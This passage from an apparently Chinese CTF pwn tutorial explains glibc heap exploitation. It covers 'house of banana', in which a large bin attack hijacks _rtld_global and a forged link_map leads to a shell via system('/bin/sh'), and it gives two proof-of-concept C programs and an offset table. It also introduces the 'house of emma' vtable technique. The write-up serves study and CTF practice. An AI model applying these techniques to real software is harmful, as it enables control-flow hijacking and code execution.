class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_dl_fini (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="type">int</span> do_audit = <span class="number">0</span>;</span><br><span class="line"> again:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns)</span><br><span class="line">      <span class="comment">//大多数时候dl_nns都是1,也就是这个循环只执行一次,ns==0</span></span><br><span class="line">    &#123;</span><br><span class="line">      __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  )</span><br><span class="line">__rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">          <span class="comment">//nloaded通常为4</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> link_map *maps[nloaded];</span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">  assert (nloaded != <span class="number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (l == l-&gt;l_real)</span><br><span class="line">      &#123;</span><br><span class="line">assert (i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">maps[i] = l;</span><br><span class="line">l-&gt;l_idx = i;</span><br><span class="line">++i;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">++l-&gt;l_direct_opencount;</span><br><span class="line">      &#125;</span><br><span class="line">  assert (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line">          <span class="comment">//因为ns==0,所以必须i==4,也就是上面的循环要执行四次</span></span><br><span class="line">  assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> nmaps = i;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),</span><br><span class="line"> <span class="literal">NULL</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> =</span> maps[i];</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_init_called)<span class="comment">//l-&gt;l_init_called字段需要大于0</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">      || (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class="line">    &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">_dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">  DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">  ns);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">    (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">    / <span class="keyword">sizeof</span> (ElfW(Addr)));<span class="comment">//sizeof==8</span></span><br><span class="line">  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)<span class="comment">//i最少要为1</span></span><br><span class="line">    ((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();<span class="comment">//!!注意此时的i已经--了</span></span><br><span class="line">&#125;</span><br><span class="line">              </span><br><span class="line">              </span><br><span class="line">              </span><br><span class="line">              </span><br><span class="line">----------------------------------------------------------------------------------------</span><br><span class="line">    <span class="comment">//后半部分在2.37以后由一个函数实现,不过实现逻辑并未改变,不影响该利用方法</span></span><br><span class="line">    <span class="type">void</span></span><br><span class="line">_dl_call_fini (<span class="type">void</span> *closure_map)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span> =</span> closure_map;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS))</span><br><span class="line">    _dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>, <span class="built_in">map</span>-&gt;l_name, <span class="built_in">map</span>-&gt;l_ns);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">  <span class="built_in">map</span>-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  ElfW(Dyn) *fini_array = <span class="built_in">map</span>-&gt;l_info[DT_FINI_ARRAY];</span><br><span class="line">  <span class="keyword">if</span> (fini_array != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ElfW(Addr) *<span class="built_in">array</span> = (ElfW(Addr) *) (<span class="built_in">map</span>-&gt;l_addr</span><br><span class="line">                                          + fini_array-&gt;d_un.d_ptr);</span><br><span class="line">      <span class="type">size_t</span> sz = (<span class="built_in">map</span>-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">                   / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (sz-- &gt; <span class="number">0</span>)</span><br><span class="line">        ((<span class="type">fini_t</span>) <span class="built_in">array</span>[sz]) ();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>函数只截取到最终利用的地方<code>((fini_t) array[i]) ();</code></p><p>因此，可以利用large bin attack劫持rtld_global的_ns_loaded指针(指向link_map,和动态链接中使用的link_map是同一个),使其指向一片可控的区域(例如堆)，</p><p>并事先在可控区域里伪造好link_map结构体，这样程序exit或者正常退出main函数时，便会执行到伪造的fini_array数组。</p><p>此外最终执行的<code>array[i]) ()</code>其在一个while循环中，所以只要把i构造恰当，那么就可完成些不太严谨的ROP。</p><p>偏移表(2.31)不同libc版本会有差异</p><div class="table-container"><table><thead><tr><th>偏移</th><th>字段</th></tr></thead><tbody><tr><td>+0</td><td>l_addr</td></tr><tr><td>+0x18</td><td>l_next</td></tr><tr><td>+0x28</td><td>l_real</td></tr><tr><td>+0x110</td><td>l_info[DT_FINI_ARRAY]</td></tr><tr><td>+0x120</td><td>l_info[DT_FINI_ARRAYSZ]</td></tr><tr><td>+0x31c位域倒数第四位</td><td>l_init_called</td></tr></tbody></table></div><p>有四个思路</p><ul><li>思路1:直接劫持(_rtld_global._dl_ns[0]._ns_loaded)，布局好其他内容，使其调用到 fini_array</li><li>思路2:伪造(_rtld_global._dl_ns[0]._ns_loaded) 的 第三个next 指针，布局好其他内容，使其调用到 fini_array</li><li>思路3:直接劫持(_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_info[26&amp;&amp;28],l_info[26]控制d_ptr,l_info[28]的d_val字段得大于8(实际上是不可控的size字段,必然满足条件),且d_ptr受到d_val和l_addr影响</li><li>思路4:修改 link_map-&gt;l_addr，根据偏移使其调用到指定区域的函数,可行性不大,因为largebin_attack只能够使l_addr修改为堆地址,<strong>除非在某些特殊情况能够做到任意写l_addr</strong></li></ul><h2 id="示例-4"><a href="#示例-4" class="headerlink" title="示例"></a>示例</h2><p>需要根据环境需要修改偏移，在有些情况下，rtld_global_ptr与libc_base的偏移在本地与远程并不是固定的，可能会在地址的第2字节处发生变化，因此可以爆破256种可能得到远程环境的精确偏移。</p><h3 id="思路1-poc"><a href="#思路1-poc" class="headerlink" title="思路1-poc:"></a>思路1-poc:</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">backdoor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;you hacked me!!&quot;</span>);</span><br><span class="line">   <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;house of banana&#x27;s poc&quot;</span>);</span><br><span class="line">   <span class="type">size_t</span> libc_base = &amp;puts - <span class="number">0x84420</span>;</span><br><span class="line">   <span class="type">size_t</span> _rtld_global_ptr_addr = libc_base + <span class="number">0x23a060</span>;</span><br><span class="line">   <span class="type">char</span> *ptr0 = <span class="built_in">malloc</span>(<span class="number">0x450</span>);</span><br><span class="line">   <span class="type">char</span> *gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="type">char</span> *ptr1 = <span class="built_in">malloc</span>(<span class="number">0x440</span>);</span><br><span class="line">   gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="type">char</span> *ptr2 = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">   gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">free</span>(ptr0);</span><br><span class="line">   <span class="comment">//put ptr9 into large bin</span></span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">   <span class="built_in">free</span>(ptr1); <span class="comment">//free ptr1 into unsorted bin</span></span><br><span class="line">   <span class="built_in">free</span>(ptr2); <span class="comment">//free ptr2 into unsorted bin</span></span><br><span class="line">   <span class="comment">//bk_nextsize = _rtld_global_ptr_addr</span></span><br><span class="line">   *(<span class="type">size_t</span> *)(ptr0 + <span class="number">0x18</span>) = _rtld_global_ptr_addr - <span class="number">0x20</span>;</span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x410</span>); <span class="comment">//large bin attack to  hijack _rtld_global_ptr</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">//fake a _rtld_global</span></span><br><span class="line">   <span class="type">size_t</span> fake_rtld_global_addr = ptr1 - <span class="number">0x10</span>;</span><br><span class="line">   <span class="type">size_t</span> *fake_rtld_global = (<span class="type">size_t</span> *)ptr1;</span><br><span class="line">   <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">   <span class="comment">//the chain&#x27;s length must &gt;= 4</span></span><br><span class="line">   fake_rtld_global[<span class="number">1</span>] = &amp;fake_rtld_global[<span class="number">2</span>];<span class="comment">//l_next</span></span><br><span class="line">   fake_rtld_global[<span class="number">3</span>] = fake_rtld_global_addr;<span class="comment">//l_real</span></span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">   fake_rtld_global[<span class="number">2</span>+<span class="number">3</span>] = &amp;fake_rtld_global[<span class="number">3</span>];</span><br><span class="line">   fake_rtld_global[<span class="number">2</span>+<span class="number">5</span>] = &amp;fake_rtld_global[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">   fake_rtld_global[<span class="number">3</span>+<span class="number">3</span>] = &amp;fake_rtld_global[<span class="number">8</span>];</span><br><span class="line">   fake_rtld_global[<span class="number">3</span>+<span class="number">5</span>] = &amp;fake_rtld_global[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">   fake_rtld_global[<span class="number">8</span>+<span class="number">3</span>] = <span class="number">0</span>;                    <span class="comment">//这一块都是在伪造next的接下来三次遍历</span></span><br><span class="line">   fake_rtld_global[<span class="number">8</span>+<span class="number">5</span>] = &amp;fake_rtld_global[<span class="number">8</span>];<span class="comment">//为什么不指向自己绕过,因为退出的条件时l==NULL</span></span><br><span class="line"><span class="comment">//如果指向自己那就永远无法退出了</span></span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">   <span class="comment">//fake a fini_array segment</span></span><br><span class="line">   fake_rtld_global[<span class="number">0x20</span>] = &amp;fake_rtld_global[<span class="number">0x30</span>];</span><br><span class="line">   fake_rtld_global[<span class="number">0x22</span>] = &amp;fake_rtld_global[<span class="number">0x23</span>];</span><br><span class="line">   fake_rtld_global[<span class="number">0x23</span>+<span class="number">1</span>] = <span class="number">0x8</span>; <span class="comment">//func ptrs total len</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   fake_rtld_global[<span class="number">0x30</span>] = <span class="number">0x1A</span>;</span><br><span class="line">   fake_rtld_global[<span class="number">0x31</span>] = <span class="number">0</span>;</span><br><span class="line">   fake_rtld_global[<span class="number">-2</span>] = &amp;fake_rtld_global[<span class="number">0x32</span>];</span><br><span class="line"></span><br><span class="line">   <span class="comment">//funcs</span></span><br><span class="line">   fake_rtld_global[<span class="number">0x32</span>] = backdoor;</span><br><span class="line"><span class="comment">//布置l_info[26]和l_info[28]指向的Elf64_Dyn结构体</span></span><br><span class="line"></span><br><span class="line">   fake_rtld_global[<span class="number">0x61</span>] = <span class="number">0x800000000</span>;<span class="comment">//l_init_call,为什么这样设置参考上面的位域声明</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路2-poc"><a href="#思路2-poc" class="headerlink" title="思路2-poc:"></a>思路2-poc:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">getLibcBase</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint64_t</span> to;</span><br><span class="line"><span class="type">uint64_t</span> from;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x400</span>];</span><br><span class="line"></span><br><span class="line">FILE* file;</span><br><span class="line"><span class="built_in">sprintf</span>(buf, <span class="string">&quot;/proc/%d/maps&quot;</span>,(<span class="type">int</span>)getpid()); </span><br><span class="line">file = fopen(buf, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(fgets(buf, <span class="keyword">sizeof</span>(buf), file)) </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;libc&quot;</span>)!=<span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%lx-%lx&quot;</span>, &amp;from, &amp;to);</span><br><span class="line">    fclose(file);</span><br><span class="line"><span class="keyword">return</span> from;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint64_t</span> libcBase    = getLibcBase();</span><br><span class="line"><span class="type">uint64_t</span> rtld_global = libcBase+<span class="number">0x23a060</span>;</span><br><span class="line"><span class="type">uint64_t</span>* next_node = (<span class="type">uint64_t</span>*)(rtld_global<span class="number">-0x48048</span>); </span><br><span class="line">    <span class="comment">// distance &amp;_rtld_global &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span></span><br><span class="line"><span class="type">uint64_t</span> fake = (<span class="type">uint64_t</span>)<span class="built_in">malloc</span>(<span class="number">0x470</span>);</span><br><span class="line"><span class="built_in">memset</span>((<span class="type">void</span>*)fake,<span class="number">0</span>,<span class="number">0x470</span>);</span><br><span class="line"></span><br><span class="line">*next_node = fake;</span><br><span class="line">    <span class="comment">//l_addr==0</span></span><br><span class="line">*(<span class="type">uint64_t</span>*)(fake+<span class="number">0x28</span>)  = fake;<span class="comment">//l_real</span></span><br><span class="line"></span><br><span class="line">*(<span class="type">uint64_t</span>*)(fake+<span class="number">0x31c</span>) = <span class="number">0x1c</span>;<span class="comment">//l_init_called</span></span><br><span class="line"></span><br><span class="line">    *(<span class="type">uint64_t</span>*)(fake+<span class="number">0x110</span>) = fake+<span class="number">0x40</span>;<span class="comment">//l_info[26]</span></span><br><span class="line">*(<span class="type">uint64_t</span>*)(fake+<span class="number">0x48</span>)  = fake+<span class="number">0x58</span>;</span><br><span class="line">*(<span class="type">uint64_t</span>*)(fake+<span class="number">0x58</span>)  = (<span class="type">uint64_t</span>)shell;</span><br><span class="line"></span><br><span class="line">*(<span class="type">uint64_t</span>*)(fake+<span class="number">0x120</span>) = fake+<span class="number">0x48</span>;<span class="comment">//l_info[28]</span></span><br><span class="line">*(<span class="type">uint64_t</span>*)(fake+<span class="number">0x50</span>)  = <span class="number">0x8</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="例题-4"><a href="#例题-4" class="headerlink" title="例题"></a>例题</h2><p><strong>西湖论剑2020决赛-husk</strong></p><h1 id="house-of-emma"><a href="#house-of-emma" class="headerlink" title="house of emma"></a>house of emma</h1><h2 id="概要-12"><a href="#概要-12" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>在GLIBC2.34 版本中，本应在 CTF 的 PWN 题中常用 Hook — <strong>free_hook 、</strong> <strong>malloc_hook</strong> 被取消，同时有些题目的限制中，又无法构造出任意地址申请。</p><p>因此在新版中各种各样的限制下，迫使转变思想：从以往的 <strong>任意地址申请</strong> <strong>→</strong> <strong>构成任意读写</strong> →<strong>从而 Getshell</strong> ，转变为：在某处写一个可控地址直接 Getshell（借助于 IO_FILE）。显而易见的，后者的所需条件一定是少于前者的。</p><p><strong>利用条件:</strong></p><ol><li>可以任意写一个可控地址（LargeBin Attack,Tcache Stashing Unlink Attack…）</li><li>可以触发 IO 流（FSOP,House OF Kiwi）</li></ol><p><strong>利用效果:</strong>控制流</p><p><strong>有效版本:</strong></p><h2 id="原理-12"><a href="#原理-12" class="headerlink" title="原理"></a>原理</h2><p>在 vtable 的合法范围内，存在一个 <strong>_IO_cookie_jumps</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_cookie_jumps</span> <span class="title">libio_vtable</span> =</span> &#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_file_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_cookie_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_file_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_file_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_cookie_read),</span><br><span class="line">  JUMP_INIT(write, _IO_cookie_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_cookie_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_cookie_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在 vtable 的检测中对具体位置的检测还是比较宽松的,只是检查是否在vtable段内，这使得可以在一定的范围内对 vtable 表的起始位置进行偏移，使其在调用<strong>具体偏移是固定</strong>的情况下，可以通过偏移来调用在 vtable 表中的任意函数，因此考虑将其指定为以下几个函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_read (FILE *fp, <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (read_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (read_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> read_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_write (FILE *fp, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (write_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="type">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">  <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"> 